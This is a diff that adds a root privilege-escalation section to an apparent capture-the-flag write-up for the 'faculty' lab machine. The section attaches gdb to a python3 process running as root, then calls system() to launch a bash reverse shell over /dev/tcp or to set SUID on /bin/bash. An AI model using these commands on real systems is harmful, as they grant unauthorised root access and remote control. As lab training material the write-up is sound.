@@ -111,4 +111,14 @@ User gbyolo may run the following commands on faculty:
 
 * I used ``ssh -i dev.key developer@10.10.11.169`` to login ssh .
 
+## Privilege Escalation (Root)
+
+* First I executed [linpeas.sh](https://github.com/topics/linpeas) script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts .
+* I have found files belongs to root annd readable by beveloper user .
+![linpeas](/images/linpeas.png)
+* then I tried to a process that’s run by root and also has the system context  then I found that ``python3`` running with ``pid 710`` .
+* I attached process to gdb using ``gdb -p 710`` command .
+* Lets call system context and run commands with high privileges .
+* You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell) using ``call (void)system("bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'")`` or you can give SUID permission to ``/bin/bash`` using ``call (void)system("chmod u+s /bin/bash")`` then ``bash -p`` , now we are root .
+
 # Thanks
